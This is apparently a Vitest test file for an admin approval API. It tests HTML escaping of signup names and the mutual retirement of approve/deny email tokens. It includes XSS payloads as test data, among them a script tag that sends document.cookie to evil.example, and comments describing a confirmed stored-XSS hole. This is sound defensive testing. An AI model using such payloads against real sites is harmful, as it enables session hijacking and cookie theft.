import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "node:fs";
import path from "node:path";
import { escapeHtml, generateApprovalToken, resolveApprovalToken } from "./admin-approval-api";

/**
 * The one-click approve/deny email links render a result page whose message is built
 * from `user.name` / `user.email` — set at signup with only `z.string().min(1)`
 * validation — and interpolated straight into `<p>${message}</p>` with no escaping.
 * Confirmed live: a user signed up with the name `<img src=x onerror=alert(1)>` had it
 * stored and echoed back verbatim by admin.getPendingUsers. Whoever clicks the
 * approve/deny link from their email — normally an admin — runs that markup in their
 * own browser, in their own session. This is the string-escaping half of the fix,
 * unit-tested directly since exercising the real Express routes end to end would need
 * a running server and mocked mail delivery for comparatively little extra assurance
 * over testing the escaping function itself.
 */
describe("escapeHtml", () => {
  it("neutralizes the exact payload confirmed live against signup's name field", () => {
    // The attribute text ("onerror=alert(...)") staying in the escaped output is
    // fine and expected — it's inert once `<` and `>` can no longer form a real tag.
    // What matters is that no live element can be parsed out of it.
    const payload = "<img src=x onerror=alert(document.domain)>";
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain("<img");
    expect(escaped).not.toContain(">");
    expect(escaped).toBe("&lt;img src=x onerror=alert(document.domain)&gt;");
  });

  it("escapes every HTML-significant character", () => {
    expect(escapeHtml(`&<>"'`)).toBe("&amp;&lt;&gt;&quot;&#39;");
  });

  it("leaves ordinary names and emails unchanged", () => {
    expect(escapeHtml("Jordan Bailey")).toBe("Jordan Bailey");
    expect(escapeHtml("jordan.bailey@demo.example.com")).toBe("jordan.bailey@demo.example.com");
  });

  it("closes a script tag injection attempt", () => {
    const payload = `</p><script>fetch('https://evil.example/steal?c='+document.cookie)</script>`;
    const escaped = escapeHtml(payload);
    expect(escaped).not.toContain("<script>");
    expect(escaped).not.toContain("</p>");
  });
});

/**
 * approve and deny tokens for the same signup are meant to be mutually exclusive: one
 * decision, two links, only one should ever actually resolve. Before this, using one
 * left the other fully live for its whole 7-day window — sitting in the same email as
 * the one that was already acted on. An admin who approved a user and later re-opened
 * that email (cleanup, mistaking it for a different, newer request, a forwarded copy)
 * and clicked Deny deleted an already-approved, possibly-active account. The same
 * exposure exists for a corporate link-scanner that GETs every link in an email before
 * a human opens it — nothing stopped it from resolving both.
 */
describe("resolveApprovalToken — sibling token retirement", () => {
  const DB = path.join(process.cwd(), "demo-db.test-approval-tokens.json");
  const ORIGINAL_ENV = { ...process.env };

  beforeEach(() => {
    process.env.DEMO_MODE = "true";
    process.env.DEMO_DB_PATH = DB;
    try { fs.unlinkSync(DB); } catch { /* not there */ }
  });

  afterEach(() => {
    process.env = { ...ORIGINAL_ENV };
    try { fs.unlinkSync(DB); } catch { /* not there */ }
  });

  async function seedUser(id: number) {
    const { getDb } = await import("./db");
    const { users } = await import("../drizzle/schema");
    const db: any = await getDb();
    await db.insert(users).values({
      id, openId: `u${id}`, email: `pending${id}@example.com`, name: `Pending ${id}`,
      role: "user", isApproved: false, loginMethod: "email",
    });
  }

  it("invalidates the deny link once the approve link has been used", async () => {
    await seedUser(901);
    const approveToken = generateApprovalToken(901, "approve");
    const denyToken = generateApprovalToken(901, "deny");

    const approved = await resolveApprovalToken(approveToken, "approve");
    expect(approved.kind).toBe("approved");

    // The deny link was never clicked, but it must no longer be live — re-clicking it
    // (or a link-scanner resolving it) must not delete the account that was just approved.
    const denied = await resolveApprovalToken(denyToken, "deny");
    expect(denied.kind).toBe("invalid");

    const { getDb } = await import("./db");
    const { users } = await import("../drizzle/schema");
    const { eq } = await import("drizzle-orm");
    const db: any = await getDb();
    const [stillThere] = await db.select().from(users).where(eq(users.id, 901));
    expect(stillThere).toBeDefined();
    expect(stillThere.isApproved).toBe(true);
  });

  it("invalidates the approve link once the deny link has been used", async () => {
    await seedUser(902);
    const approveToken = generateApprovalToken(902, "approve");
    const denyToken = generateApprovalToken(902, "deny");

    const denied = await resolveApprovalToken(denyToken, "deny");
    expect(denied.kind).toBe("denied");

    const approved = await resolveApprovalToken(approveToken, "approve");
    expect(approved.kind).toBe("invalid");
  });

  it("invalidates the deny link when the approve link is re-clicked on an already-approved user", async () => {
    await seedUser(903);
    const approveToken = generateApprovalToken(903, "approve");
    const denyToken = generateApprovalToken(903, "deny");

    await resolveApprovalToken(approveToken, "approve");
    // Re-clicking the same approve link a second time (e.g. a slow email client
    // double-firing the request) is the "already-approved" branch, not "approved" —
    // it must retire the sibling exactly the same way.
    const again = await resolveApprovalToken(approveToken, "approve");
    expect(again.kind).toBe("invalid");

    const denied = await resolveApprovalToken(denyToken, "deny");
    expect(denied.kind).toBe("invalid");
  });

  it("still approves and denies correctly when only one link is ever used", async () => {
    await seedUser(904);
    const approveOnly = generateApprovalToken(904, "approve");
    const approved = await resolveApprovalToken(approveOnly, "approve");
    expect(approved.kind).toBe("approved");
    if (approved.kind === "approved") {
      expect(approved.user.email).toBe("pending904@example.com");
    }

    await seedUser(905);
    const denyOnly = generateApprovalToken(905, "deny");
    const denied = await resolveApprovalToken(denyOnly, "deny");
    expect(denied.kind).toBe("denied");

    const { getDb } = await import("./db");
    const { users } = await import("../drizzle/schema");
    const { eq } = await import("drizzle-orm");
    const db: any = await getDb();
    const [gone] = await db.select().from(users).where(eq(users.id, 905));
    expect(gone).toBeUndefined();
  });
});
